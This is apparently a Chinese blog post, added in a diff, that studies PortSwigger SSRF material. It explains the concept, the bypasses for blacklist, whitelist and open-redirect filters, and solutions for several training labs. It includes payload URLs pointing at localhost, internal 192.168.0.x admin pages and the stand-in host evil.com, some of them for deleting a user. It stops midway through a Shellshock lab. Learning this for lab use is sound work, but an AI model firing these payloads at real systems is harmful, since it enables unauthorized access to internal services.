@@ -71,6 +71,238 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-Server-side request forgery (SSRF)" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/01/19/Server-side%20request%20forgery%20(SSRF)/" class="article-date">
+  <time class="dt-published" datetime="2026-01-18T20:01:37.000Z" itemprop="datePublished">2026-01-19</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/portswigger/">portswigger</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/01/19/Server-side%20request%20forgery%20(SSRF)/">3.Server-side request forgery (SSRF)</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>修订时间：2026.1.19</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface#remoteclient">https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface#remoteclient</a></p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet">https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet</a></p>
+<h1 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h1><p>服务器端请求伪造（SSRF）是一种网络安全漏洞，攻击者可利用此漏洞使服务器端应用程序向非预期位置发起请求。在典型的SSRF攻击中，攻击者可能诱使服务器连接至组织内部基础设施中的仅限内部访问的服务。在其他情况下，攻击者可能迫使服务器连接至任意外部系统，从而导致敏感数据泄露，例如授权凭证。</p>
+<h2 id="1-1-SSRF攻击会产生什么影响？"><a href="#1-1-SSRF攻击会产生什么影响？" class="headerlink" title="1.1 SSRF攻击会产生什么影响？"></a>1.1 SSRF攻击会产生什么影响？</h2><p>成功的SSRF攻击通常会导致组织内部发生未经授权的操作或数据访问。这种攻击可能发生在存在漏洞的应用程序中，也可能发生在该应用程序可通信的其他后端系统上。在某些情况下，SSRF漏洞可能允许攻击者执行任意命令。若SSRF漏洞利用导致连接外部第三方系统，可能引发恶意后续攻击，且攻击源头看似来自托管漏洞应用的组织。</p>
+<h2 id="1-2-常见SSRF攻击方式"><a href="#1-2-常见SSRF攻击方式" class="headerlink" title="1.2 常见SSRF攻击方式"></a>1.2 常见SSRF攻击方式</h2><p>SSRF攻击常利用信任关系，从漏洞应用发起攻击并执行未授权操作。此类信任关系可能存在于服务器之间，或同一组织内的其他后端系统之间。</p>
+<h3 id="1-2-1-针对服务器的SSRF攻击"><a href="#1-2-1-针对服务器的SSRF攻击" class="headerlink" title="1.2.1 针对服务器的SSRF攻击"></a>1.2.1 针对服务器的SSRF攻击</h3><p> 在针对服务器的SSRF攻击中，攻击者诱使应用程序通过其回环网络接口向托管该应用的服务器发起HTTP请求。这通常涉及提供包含127.0.0.1（指向回环适配器的保留IP地址）或localhost（该适配器的常用名称）等主机名的URL。例如，假设某购物应用允许用户查询商品在特定门店的库存状态。为提供库存信息，该应用需调用多个后端REST API。其实现方式是通过前端HTTP请求将URL传递至相关后端API接口。当用户查询商品库存时，其浏览器将发起如下请求：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /product/stock HTTP/1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 118</span><br><span class="line"></span><br><span class="line">stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1</span><br></pre></td></tr></table></figure>
+
+<p>这将促使服务器向指定URL发起请求，获取库存状态并返回给用户。在此示例中，攻击者可修改请求指向服务器本地URL：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /product/stock HTTP/1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 118</span><br><span class="line"></span><br><span class="line">stockApi=http://localhost/admin</span><br></pre></td></tr></table></figure>
+
+<p>服务器将获取&#x2F;admin URL的内容并返回给用户。攻击者虽可访问&#x2F;admin网址，但管理功能通常仅限认证用户使用。这意味着攻击者无法获取有价值的信息。然而，若对&#x2F;admin网址的请求来自本地机器，常规访问控制将被绕过。由于请求看似来自可信位置，应用程序会授予管理功能的完全访问权限。</p>
+<p>为什么应用程序会这样行为，并默认信任来自本地机器的请求？这可能由多种原因导致：</p>
+<p>• 访问控制检查可能由位于应用服务器前端的其他组件实现。当连接回服务器时，该检查会被绕过。</p>
+<p>• 为灾难恢复目的，应用程序可能允许来自本地机器的任何用户无需登录即可进行管理访问。这为管理员在遗失凭证时提供了系统恢复途径，其前提是仅完全可信用户会直接访问服务器端。</p>
+<p>• 管理界面可能监听与主应用程序不同的端口号，用户无法直接访问。</p>
+<p>此类信任关系——即本地机器发起的请求与普通请求获得不同处理——往往使SSRF成为关键漏洞。</p>
+<h3 id="1-2-2-SSRF-attacks-against-other-back-end-systems"><a href="#1-2-2-SSRF-attacks-against-other-back-end-systems" class="headerlink" title="1.2.2 SSRF attacks against other back-end systems"></a>1.2.2 SSRF attacks against other back-end systems</h3><p>针对其他后端系统的SSRF攻击在某些情况下，应用服务器能够与用户无法直接访问的后端系统交互。这些系统通常采用不可路由的私有IP地址。由于后端系统通常受到网络拓扑的保护，其安全防护措施往往较为薄弱。多数情况下，内部后端系统包含敏感功能模块，任何能与系统交互的用户均可未经认证直接访问。以先前示例为例，假设后端存在管理接口<a target="_blank" rel="noopener" href="https://192.168.0.68/admin%E3%80%82%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E6%8F%90%E4%BA%A4%E4%BB%A5%E4%B8%8B%E8%AF%B7%E6%B1%82%E5%88%A9%E7%94%A8SSRF%E6%BC%8F%E6%B4%9E%E8%AE%BF%E9%97%AE%E7%AE%A1%E7%90%86%E7%95%8C%E9%9D%A2%EF%BC%9APOST">https://192.168.0.68/admin。攻击者可提交以下请求利用SSRF漏洞访问管理界面：POST</a> &#x2F;product&#x2F;stock HTTP&#x2F;1.0<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 118</p>
+<p>stockApi&#x3D;<a target="_blank" rel="noopener" href="http://192.168.0.68/admin">http://192.168.0.68/admin</a></p>
+<p>‍</p>
+<h2 id="1-3-绕过常见的SSRF防御"><a href="#1-3-绕过常见的SSRF防御" class="headerlink" title="1.3 绕过常见的SSRF防御"></a>1.3 绕过常见的SSRF防御</h2><p>在存在SSRF（服务器端请求伪造）行为的应用程序中，通常会部署防御机制以防止恶意利用。然而，这些防御措施往往可以被绕过。</p>
+<h3 id="1-3-1-黑名单"><a href="#1-3-1-黑名单" class="headerlink" title="1.3.1 黑名单"></a>1.3.1 黑名单</h3><p>当应用程序使用基于黑名单的输入过滤来阻止包含如127.0.0.1、localhost等主机名或类似&#x2F;admin等敏感URL时，攻击者可通过多种方式规避此类限制：</p>
+<ul>
+<li>使用127.0.0.1的其他IP表示形式，例如十进制数2130706433、八进制数017700000001，或简写形式127.1；</li>
+<li>注册一个指向127.0.0.1的自定义域名，例如可使用spoofed.burpcollaborator.net实现此目的；</li>
+<li>对被拦截的字符串进行混淆处理，例如通过URL编码或改变字母大小写；</li>
+<li>提供一个由攻击者控制的URL，该URL会重定向至目标地址。可尝试使用不同类型的重定向状态码以及不同的目标协议（例如，在重定向前从http:切换为https:），已有案例表明这种方式可绕过部分反SSRF过滤机制。</li>
+</ul>
+<h3 id="1-3-2-基于白名单的输入过滤器下的SSRF"><a href="#1-3-2-基于白名单的输入过滤器下的SSRF" class="headerlink" title="1.3.2 基于白名单的输入过滤器下的SSRF"></a>1.3.2 基于白名单的输入过滤器下的SSRF</h3><p>某些应用程序仅允许输入与白名单中允许值匹配的内容。该过滤器可能在输入开头或输入内容中查找匹配项。您可能通过<strong>利用URL解析中的不一致性</strong>来绕过此过滤器。URL规范包含若干特性，当采用此方法进行临时解析和验证时极易被忽略：</p>
+<ol>
+<li><p>URL 凭证语法scheme:&#x2F;&#x2F;user:password@host：</p>
+<p>开发者可能编写代码检查 URL 是否以 <code>http://whitelist.com</code>​ <strong>开头，</strong> 后端 HTTP 库（如 cURL、Python Requests 等）会将 <code>@</code>​ 之前的内容识别为“用户名&#x2F;密码”，而将 <code>@</code> 之后的内容识别为真正的“目标主机”。</p>
+<p>payload:<code>http://whitelist.com:fakePassword@evil.com</code></p>
+</li>
+<li><p>URL 中 <code>#</code>​ 之后的内容被称为“片段标识符”（Fragment），通常仅在客户端使用，服务器发起请求时往往会截断它。开发者可能编写代码检查 URL 中是否 <strong>包含</strong> <code>whitelist.com</code>​ 字符串。攻击者将白名单域名放在片段中，满足了“包含”条件，但实际请求的目标是片段前的域名。过滤器检测到字符串中存在 <code>whitelist.com</code>​，予以放行。但后端 HTTP 库在处理请求时，通常会丢弃 <code>#</code>​ 及其后的内容，从而请求 <code>evil.com</code>。</p>
+<p>payload:<code>http://evil.com/path?query=1#whitelist.com</code></p>
+</li>
+<li><p>利用 DNS 命名层级（Subdomains）:你在你控制的域名（<code>evil.com</code>）下创建一个子域名，将其命名为与白名单一致。</p>
+<p>payload:<code>http://whitelist.com.evil.com</code></p>
+</li>
+<li><p>利用 URL 编码与双重编码（Encoding）:利用验证层（过滤器）和执行层（后端 HTTP 库）对 URL 解码时机的不同。</p>
+</li>
+</ol>
+<ul>
+<li><p><strong>过滤器逻辑：</strong>  过滤器可能在解码前进行匹配，或者禁止了特定字符（如 <code>@</code>​），但允许 <code>%</code>。</p>
+</li>
+<li><p><strong>绕过原理：</strong></p>
+<ul>
+<li><strong>单次编码：</strong>  将特殊字符（如 <code>@</code>​）编码为 <code>%40</code>。如果过滤器只是简单的字符串查找，它可能看不出这是个凭证结构。</li>
+<li><strong>双重编码：</strong>  将 <code>%</code>​ 本身也编码（<code>%</code>​ -&gt; <code>%25</code>）。如果前端防火墙解码一次，后端应用解码一次，就会产生差异。</li>
+</ul>
+</li>
+</ul>
+<p>payload:<a href="http://whitelist.com%40evil.com">http://whitelist.com%40evil.com</a>   或  <a href="http://whitelist.com%2540evil.com">http://whitelist.com%2540evil.com</a></p>
+<p>在防御较强的环境中，往往需要组合上述技术。</p>
+<h3 id="1-3-3-通过开放重定向绕过SSRF过滤器"><a href="#1-3-3-通过开放重定向绕过SSRF过滤器" class="headerlink" title="1.3.3 通过开放重定向绕过SSRF过滤器"></a>1.3.3 通过开放重定向绕过SSRF过滤器</h3><p>只要用于发起后端HTTP请求的API支持重定向，即可构造满足过滤器要求的URL，从而将请求重定向至目标后端。例如，某应用存在开放重定向漏洞，当访问以下URL时：</p>
+<p>&#x3D;&#x3D;&#x2F;product&#x2F;nextProduct?currentProductId&#x3D;6&amp;path&#x3D;<a target="_blank" rel="noopener" href="http://evil-user.net==/">http://evil-user.net==</a></p>
+<p>会重定向至：</p>
+<p><a target="_blank" rel="noopener" href="http://evil-user.net/">http://evil-user.net</a></p>
+<p>此时可利用该漏洞绕过URL过滤器，并通过以下方式利用SSRF漏洞：</p>
+<p>​<code>POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118</code></p>
+<p>​<code>stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin</code></p>
+<p>此SSRF攻击成立的原因在于：应用程序首先验证提供的stockAPI网址是否属于允许域（该网址确实属于允许域）。随后应用程序请求该URL，触发开放重定向机制。系统将遵循重定向路径，向攻击者指定的内部URL发起请求。</p>
+<h2 id="1-4-Blind-SSRF-vulnerabilities"><a href="#1-4-Blind-SSRF-vulnerabilities" class="headerlink" title="1.4 Blind SSRF vulnerabilities"></a>1.4 Blind SSRF vulnerabilities</h2><p>盲SSRF漏洞是指当应用程序被诱导向指定URL发起后端HTTP请求时，后端请求的响应内容不会出现在应用程序前端响应中的漏洞，有时可导致在服务器或其他后端组件上实现完整的远程代码执行。</p>
+<h3 id="1-4-1-如何发现并利用盲SSRF漏洞？"><a href="#1-4-1-如何发现并利用盲SSRF漏洞？" class="headerlink" title="1.4.1 如何发现并利用盲SSRF漏洞？"></a>1.4.1 如何发现并利用盲SSRF漏洞？</h3><p>检测盲SSRF漏洞最可靠的方法是采用带外攻击（OAST）技术。具体操作包括：</p>
+<p>尝试向受控外部系统触发HTTP请求，并监测与该系统的网络交互。</p>
+<p>运用带外技术的最简便高效方式是使用Burp Collaborator。通过该工具可生成唯一域名，将其封装在有效负载中发送至应用程序，并监测与这些域名的交互。若观察到应用程序发出的入站HTTP请求，则表明存在SSRF漏洞。</p>
+<p>在测试SSRF漏洞时，常见现象是观察到对指定协作方域名的DNS解析操作，但后续未产生HTTP请求。这种情况通常源于应用程序尝试向该域名发起HTTP请求，触发了初始DNS解析，但实际HTTP请求被网络层过滤机制拦截。基础设施允许外发DNS流量的情况较为普遍——因其在众多场景中不可或缺——但会阻断指向意外目标的HTTP连接。</p>
+<p>仅识别出可触发带外HTTP请求的盲SSRF漏洞本身并不能提供可利用路径。由于无法查看后端请求的响应，该行为无法用于探索应用服务器可访问系统中的内容。但仍可利用其探测服务器本身或其他后端系统上的其他漏洞。可&#x3D;&#x3D;对内部IP地址空间进行盲扫，发送专门用于检测已知漏洞的有效载荷&#x3D;&#x3D;。若这些有效载荷同时采用盲外带技术，则可能发现未打补丁的内部服务器上存在关键漏洞。</p>
+<p>利用盲SSRF漏洞的另一种途径是诱使应用程序连接至攻击者控制的系统，并向发起连接的HTTP客户端返回恶意响应。若能利用服务器HTTP实现中的严重客户端漏洞，攻击者可能在应用程序基础设施内实现远程代码执行。</p>
+<h2 id="1-5-Finding-hidden-attack-surface-for-SSRF-vulnerabilities"><a href="#1-5-Finding-hidden-attack-surface-for-SSRF-vulnerabilities" class="headerlink" title="1.5 Finding hidden attack surface for SSRF vulnerabilities"></a>1.5 Finding hidden attack surface for SSRF vulnerabilities</h2><p>许多服务器端请求伪造漏洞很容易被发现，因为应用程序的正常流量涉及包含完整URL的请求参数。而其他类型的SSRF漏洞则更难定位。请求中的部分URL有时，应用程序仅将主机名或URL路径的一部分放入请求参数中。提交的值随后会在服务器端被整合成完整的URL进行请求。如果该值能被轻易识别为主机名或URL路径，潜在的攻击面可能显而易见。但由于无法控制请求的完整URL，其作为完整SSRF漏洞的可利用性可能受限。数据格式内的URL 某些应用采用允许包含URL的数据格式进行传输，这些URL可能被格式解析器调用请求。</p>
+<p>XML数据格式便是典型案例，该格式被广泛应用于Web应用程序中，用于在客户端与服务器间传输结构化数据。当应用程序接收XML格式数据并进行解析时，可能存在XXE注入漏洞，同时亦可能通过XXE漏洞引发SSRF攻击。我们将在探讨XXE注入漏洞时对此进行详细说明。 通过Referer头引发的SSRF 部分应用程序使用服务器端分析软件追踪访问者。这类软件通常会记录请求中的Referer标头，以便追踪来源链接。分析软件常会访问Referer标头中出现的第三方URL，此举通常用于分析来源网站内容，包括来源链接使用的锚文本。因此，Referer标头往往成为SSRF漏洞的有效攻击面。有关涉及Referer标头的漏洞示例，请参阅盲SSRF漏洞相关章节。</p>
+<h1 id="2-实验"><a href="#2-实验" class="headerlink" title="2.实验"></a>2.实验</h1><h2 id="Lab-Basic-SSRF-against-the-local-server"><a href="#Lab-Basic-SSRF-against-the-local-server" class="headerlink" title="Lab: Basic SSRF against the local server"></a>Lab: Basic SSRF against the local server</h2><p>该实验室具备库存检查功能，该功能从内部系统获取数据。为完成实验，请将库存检查URL修改为访问管理界面<a target="_blank" rel="noopener" href="http://localhost/admin%EF%BC%8C%E5%B9%B6%E5%88%A0%E9%99%A4%E7%94%A8%E6%88%B7carlos%E3%80%82">http://localhost/admin，并删除用户carlos。</a></p>
+<p><img src="/images/image-20251201221901-ymw4141.png" alt="image"></p>
+<p><img src="/images/image-20251201221926-j2plhqf.png" alt="image"></p>
+<p>观察到删除的参数，修改stockapi的参数：</p>
+<p><img src="/images/image-20251201222147-0u1e0zr.png" alt="image"></p>
+<p><img src="/images/image-20251201222230-8e4v0fy.png" alt="image"></p>
+<h2 id="Lab-Basic-SSRF-against-another-back-end-system"><a href="#Lab-Basic-SSRF-against-another-back-end-system" class="headerlink" title="Lab: Basic SSRF against another back-end system"></a>Lab: Basic SSRF against another back-end system</h2><p>该实验室具备库存检查功能，可从内部系统获取数据。为完成实验，请使用库存检查功能扫描内部192.168.0.X网络段，查找端口8080上的管理界面，随后通过该界面删除用户carlos。</p>
+<p>‍</p>
+<p>访问产品页面，点击“检查库存”，在Burp Suite中拦截请求并发送至Burp Intruder。2. 将stockApi参数修改为<a target="_blank" rel="noopener" href="http://192.168.0.1:8080/admin%EF%BC%8C%E9%80%89%E4%B8%ADIP%E5%9C%B0%E5%9D%80%E6%9C%AB%E4%BD%8D%E5%AD%97%E8%8A%82%EF%BC%88%E6%95%B0%E5%AD%971%EF%BC%89%E5%90%8E%E7%82%B9%E5%87%BB%E6%B7%BB%E5%8A%A0%C2%A7%E3%80%823">http://192.168.0.1:8080/admin，选中IP地址末位字节（数字1）后点击添加§。3</a>. 在有效载荷侧边栏中，将有效载荷类型改为数字，分别在起始值、终止值和步长框中输入1、255和1。4. 点击开始攻击。5. 点击状态列按状态码升序排序。应出现一条状态码为200的条目，显示管理界面。6. 点击该请求，将其发送到Burp Repeater，并将stockApi中的路径修改为：&#x2F;admin&#x2F;delete?username&#x3D;carlos</p>
+<p><img src="/images/image-20251202174847-kda9f3f.png" alt="image"></p>
+<p>记得url编码</p>
+<h2 id="Lab-SSRF-with-blacklist-based-input-filter"><a href="#Lab-SSRF-with-blacklist-based-input-filter" class="headerlink" title="Lab: SSRF with blacklist-based input filter"></a>Lab: SSRF with blacklist-based input filter</h2><p>该实验室具备库存检查功能，该功能从内部系统获取数据。为完成实验，请将库存检查URL修改为访问管理界面<a target="_blank" rel="noopener" href="http://localhost/admin%EF%BC%8C%E5%B9%B6%E5%88%A0%E9%99%A4%E7%94%A8%E6%88%B7carlos%E3%80%82%E5%BC%80%E5%8F%91%E8%80%85%E9%83%A8%E7%BD%B2%E4%BA%86%E4%B8%A4%E7%A7%8D%E5%BC%B1%E6%8A%97SSRF%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6%EF%BC%8C%E6%82%A8%E9%9C%80%E8%A6%81%E7%BB%95%E8%BF%87%E8%BF%99%E4%BA%9B%E9%98%B2%E5%BE%A1%E3%80%82">http://localhost/admin，并删除用户carlos。开发者部署了两种弱抗SSRF防御机制，您需要绕过这些防御。</a></p>
+<p>访问商品页面，点击”查看库存”，在Burp Suite中拦截请求并转发至Burp Repeater。2. 将stockApi参数中的URL修改为<a target="_blank" rel="noopener" href="http://127.0.0.1/%EF%BC%8C%E8%A7%82%E5%AF%9F%E8%AF%B7%E6%B1%82%E8%A2%AB%E6%8B%A6%E6%88%AA%E3%80%823">http://127.0.0.1/，观察请求被拦截。3</a>. 通过将URL改为：<a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.1/</a> 绕过拦截。4. 将URL改为<a target="_blank" rel="noopener" href="http://127.0.0.1/admin%EF%BC%8C%E8%A7%82%E5%AF%9FURL%E5%86%8D%E6%AC%A1%E8%A2%AB%E6%8B%A6%E6%88%AA%E3%80%825">http://127.1/admin，观察URL再次被拦截。5</a>. 将”a”进行双重URL编码为%2561实现混淆，从而访问管理界面并删除目标用户。</p>
+<p>‍</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1_"external/">http://127.0.0.1_&quot;External</a> stock check blocked for security reasons”</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.1</a>      HTTP&#x2F;2 200 OK</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/admin">http://127.1/admin</a>      “External stock check blocked for security reasons”</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/%25%36%31%25%36%34%25%36%44%25%36%39%25%36%45">http://127.1/%25%36%31%25%36%34%25%36%44%25%36%39%25%36%45</a>      HTTP&#x2F;2 200 OK</p>
+<p><img src="/images/image-20251202210013-zvuvoq2.png" alt="image"></p>
+<p>双重url编码：</p>
+<p><img src="/images/image-20251202203730-0ghn6xn.png" alt="image"></p>
+<h2 id="Lab-SSRF-with-whitelist-based-input-filter"><a href="#Lab-SSRF-with-whitelist-based-input-filter" class="headerlink" title="Lab: SSRF with whitelist-based input filter"></a>Lab: SSRF with whitelist-based input filter</h2><p>该实验室具备库存查询功能，该功能从内部系统获取数据。<br>为完成实验，请将库存查询网址修改为访问管理界面：<a target="_blank" rel="noopener" href="http://localhost/admin%EF%BC%8C%E5%B9%B6%E5%88%A0%E9%99%A4%E7%94%A8%E6%88%B7carlos%E3%80%82">http://localhost/admin，并删除用户carlos。</a><br>开发者部署了反SSRF防御机制，您需要绕过该机制。</p>
+<p>‍</p>
+<ol>
+<li><p>访问商品页面，点击”查看库存”，在Burp Suite中拦截请求并转发至Burp Repeater。</p>
+</li>
+<li><p>将stockApi参数中的URL修改为<a target="_blank" rel="noopener" href="http://127.0.0.1/%EF%BC%8C%E8%A7%82%E5%AF%9F%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E8%A7%A3%E6%9E%90URL%E3%80%81%E6%8F%90%E5%8F%96%E4%B8%BB%E6%9C%BA%E5%90%8D%E5%B9%B6%E8%BF%9B%E8%A1%8C%E7%99%BD%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%9A%84%E8%BF%87%E7%A8%8B%E3%80%82">http://127.0.0.1/，观察应用程序解析URL、提取主机名并进行白名单验证的过程。</a></p>
+<p><img src="/images/image-20251203093330-vqfn1to.png" alt="image"></p>
+</li>
+<li><p>将URL改为<a target="_blank" rel="noopener" href="http://username@stock.weliketoshop.net/%EF%BC%8C%E8%A7%82%E5%AF%9F%E8%AF%B7%E6%B1%82%E8%A2%AB%E6%8E%A5%E5%8F%97%EF%BC%8C%E8%A1%A8%E6%98%8EURL%E8%A7%A3%E6%9E%90%E5%99%A8%E6%94%AF%E6%8C%81%E5%B5%8C%E5%85%A5%E5%87%AD%E8%AF%81%E3%80%82">http://username@stock.weliketoshop.net/，观察请求被接受，表明URL解析器支持嵌入凭证。</a></p>
+</li>
+</ol>
+<p><img src="/images/image-20251203093512-drpjpzi.png" alt="image"></p>
+<ol start="4">
+<li><pre><code class="xml">在用户名前添加#符号，观察URL被拒绝。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```txt</span><br><span class="line">Double-URL encode the # to %2523，观察到极其可疑的&quot;Internal Server Error&quot;响应，</span><br><span class="line">表明服务器可能尝试连接至&quot;username&quot;。</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ol>
+<p><img src="/images/image-20251203093652-c5vrxfc.png" alt="image"></p>
+<ol start="5">
+<li>访问管理界面并删除目标用户时，将URL修改为： <a target="_blank" rel="noopener" href="http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos">http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos</a></li>
+</ol>
+<p><img src="/images/image-20251203093736-6dpnqdu.png" alt="image"></p>
+<p>‍</p>
+<p><img src="/images/image-20251203095137-zaxeqyd.png" alt="image"></p>
+<p>‍</p>
+<p>http%3A%2F%2Flocalhost%<a href="mailto:&#x32;&#x35;&#50;&#x33;&#64;&#115;&#x74;&#111;&#x63;&#x6b;&#x2e;&#119;&#101;&#x6c;&#105;&#x6b;&#x65;&#x74;&#x6f;&#115;&#x68;&#111;&#112;&#x2e;&#110;&#101;&#116;">&#x32;&#x35;&#50;&#x33;&#64;&#115;&#x74;&#111;&#x63;&#x6b;&#x2e;&#119;&#101;&#x6c;&#105;&#x6b;&#x65;&#x74;&#x6f;&#115;&#x68;&#111;&#112;&#x2e;&#110;&#101;&#116;</a>&#x2F;admin&#x2F;delete?username&#x3D;carlos</p>
+<p><img src="/images/image-20251203095001-ty9qe41.png" alt="image"></p>
+<ul>
+<li>​ <strong>​<code>#</code>​</strong> ​ <strong>字符（片段标识符&#x2F;锚点）</strong>  标记了 URL 中资源的 ​<strong>局部位置</strong>。</li>
+<li><strong>最关键的是：</strong>  当一个 URL 被 HTTP 客户端（如浏览器或底层的 HTTP 库）解析时，​ <strong>​<code>#</code>​</strong> ​ <strong>及其后面的所有内容通常不会被发送到服务器端</strong>。它是客户端本地使用的。</li>
+</ul>
+<p>会将 <code>#</code>​ 视为 URL 路径的一部分，然后将 <code>@</code>​ 识别为用户凭证分隔符。将 <code>@</code>​ <strong>后面的部分</strong> 视为 <strong>真正的主机名，</strong> 而将 <code>@</code>​ <strong>前面的部分</strong> (<code>localhost/#</code>) 视为用户名&#x2F;密码</p>
+<p>​<code>localhost</code>​ 的作用是 <strong>满足前端&#x2F;过滤器的白名单或格式检查</strong>，防止其触发 500 错误，从而让你的 payload 能顺利进入 URL 解析器阶段。</p>
+<h2 id="Lab-SSRF-with-filter-bypass-via-open-redirection-vulnerability"><a href="#Lab-SSRF-with-filter-bypass-via-open-redirection-vulnerability" class="headerlink" title="Lab: SSRF with filter bypass via open redirection vulnerability"></a>Lab: SSRF with filter bypass via open redirection vulnerability</h2><p>该实验室具备库存检查功能，该功能从内部系统获取数据。为完成实验，请将库存检查URL修改为访问管理界面<a target="_blank" rel="noopener" href="http://192.168.0.12:8080/admin%EF%BC%8C%E5%B9%B6%E5%88%A0%E9%99%A4%E7%94%A8%E6%88%B7carlos%E3%80%82%E5%BA%93%E5%AD%98%E6%A3%80%E6%9F%A5%E7%A8%8B%E5%BA%8F%E5%B7%B2%E8%A2%AB%E9%99%90%E5%88%B6%E4%BB%85%E8%AE%BF%E9%97%AE%E6%9C%AC%E5%9C%B0%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%9B%A0%E6%AD%A4%E6%82%A8%E9%9C%80%E8%A6%81%E5%85%88%E6%89%BE%E5%88%B0%E5%BD%B1%E5%93%8D%E8%AF%A5%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91%E6%BC%8F%E6%B4%9E%E3%80%82">http://192.168.0.12:8080/admin，并删除用户carlos。库存检查程序已被限制仅访问本地应用程序，因此您需要先找到影响该应用程序的开放重定向漏洞。</a></p>
+<ol>
+<li><p>访问商品页面，点击”查看库存”，在Burp Suite中拦截请求并转发至Burp Repeater。</p>
+</li>
+<li><p>尝试篡改stockApi参数，观察到无法使服务器直接向其他主机发送请求。</p>
+</li>
+<li><p>点击”下一件商品”，观察到路径参数被放入重定向响应的Location头中，导致开放重定向漏洞。</p>
+<p><img src="/images/image-20251203100623-te97z2u.png" alt="image"></p>
+</li>
+<li><p>构建利用开放重定向漏洞的URL，使其跳转至管理界面，并将此链接填入库存查询器的stockApi参数：&#x2F;product&#x2F;nextProduct?path&#x3D;<a target="_blank" rel="noopener" href="http://192.168.0.12:8080/admin">http://192.168.0.12:8080/admin</a></p>
+</li>
+</ol>
+<p>   <img src="/images/image-20251203100859-g1eiab2.png" alt="image"><br>5. 观察库存查询器跟随重定向跳转至管理页面。<br>6. 修改路径删除目标用户：&#x2F;product&#x2F;nextProduct?path&#x3D;<a target="_blank" rel="noopener" href="http://192.168.0.12:8080/admin/delete?username=carlos">http://192.168.0.12:8080/admin/delete?username=carlos</a></p>
+<h2 id="Lab-Blind-SSRF-with-out-of-band-detection"><a href="#Lab-Blind-SSRF-with-out-of-band-detection" class="headerlink" title="Lab: Blind SSRF with out-of-band detection"></a>Lab: Blind SSRF with out-of-band detection</h2><p>本网站使用分析软件，当产品页面加载时，该软件会获取Referer头中指定的URL。为完成实验，请利用此功能触发向公共Burp协作服务器发送HTTP请求。</p>
+<ol>
+<li>访问某个产品页面，在Burp Suite中拦截请求并转发至Burp Repeater。</li>
+<li>切换至Repeater标签页。选中Referer头部字段，右键点击选择”插入协作器有效负载”，用Burp协作器生成的域名替换原始域名。发送请求。</li>
+<li>切换至协作器标签页，点击”立即轮询”。若未显示交互记录，请等待数秒后重试，因服务器端命令采用异步执行机制。</li>
+<li>您将看到应用程序因您的有效负载触发的DNS及HTTP交互记录。</li>
+</ol>
+<p><img src="/images/image-20251203103051-3zjeuj8.png" alt="image"></p>
+<p><img src="/images/image-20251203103058-6h9r8qr.png" alt="image"></p>
+<h2 id="Lab-Blind-SSRF-with-Shellshock-exploitation"><a href="#Lab-Blind-SSRF-with-Shellshock-exploitation" class="headerlink" title="Lab: Blind SSRF with Shellshock exploitation"></a>Lab: Blind SSRF with Shellshock exploitation</h2><p>本网站使用分析软件，当产品页面加载时会获取Referer头中指定的URL。为完成实验，请利用此功能对192.168.0.X网段内端口8080的内部服务器发起盲SSRF攻击。在盲攻击中，需向该内部服务器发送Shellshock有效载荷，以窃取操作系统用户的名称。</p>
+<ol>
+<li>在Burp Suite Professional中，从BApp商店安装Collaborator Everywhere扩展。</li>
+<li>将实验室域名添加至Burp Suite的目标范围，使Collaborator Everywhere能定位该域名。</li>
+<li>浏览该网站。</li>
+<li>观察到加载产品页面时，会通过Referer头部触发与Burp Collaborator的HTTP交互。</li>
+<li>观察到HTTP交互中包含HTTP请求内的User-Agent字符串。</li>
+</ol>
+<p><img src="/images/image-20251203104849-o6y2cp3.png" alt="image"></p>
+<ol>
+<li>将产品页面的请求发送至Burp Intruder</li>
